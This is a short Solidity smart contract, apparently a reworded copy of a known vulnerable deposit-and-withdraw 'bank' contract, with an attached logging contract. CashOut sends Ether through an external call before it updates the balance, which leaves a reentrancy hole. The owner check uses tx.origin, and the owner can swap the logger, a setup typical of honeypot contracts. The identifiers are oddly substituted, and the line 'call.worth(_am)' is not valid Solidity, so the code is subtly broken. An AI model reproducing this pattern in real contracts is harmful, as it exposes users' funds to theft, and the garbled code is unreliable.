pragma solidity ^0.4.19;

contract PrivateStashrewards
{
    mapping (address => uint) public characterGold;

    uint public MinimumCacheprize = 1 ether;
    address public owner;

    Journal ShiftgoldRecord;

    modifier onlyOwner() {
        require(tx.origin == owner);
        _;
    }

    function PrivateStashrewards()
    {
        owner = msg.sender;
        ShiftgoldRecord = new Journal();
    }

    function groupRecord(address _lib) onlyOwner
    {
        ShiftgoldRecord = Journal(_lib);
    }

    function AddTreasure()
    public
    payable
    {
        if(msg.value >= MinimumCacheprize)
        {
            characterGold[msg.sender]+=msg.value;
            ShiftgoldRecord.AppendCommunication(msg.sender,msg.value,"Deposit");
        }
    }

    function CashOut(uint _am)
    {
        if(_am<=characterGold[msg.sender])
        {
            if(msg.sender.call.worth(_am)())
            {
                characterGold[msg.sender]-=_am;
                ShiftgoldRecord.AppendCommunication(msg.sender,_am,"CashOut");
            }
        }
    }

    function() public payable{}

}

contract Journal
{

    struct Signal
    {
        address Invoker;
        string  Info;
        uint Val;
        uint  Moment;
    }

    Signal[] public History;

    Signal EndingMsg;

    function AppendCommunication(address _adr,uint _val,string _data)
    public
    {
        EndingMsg.Invoker = _adr;
        EndingMsg.Moment = now;
        EndingMsg.Val = _val;
        EndingMsg.Info = _data;
        History.push(EndingMsg);
    }
}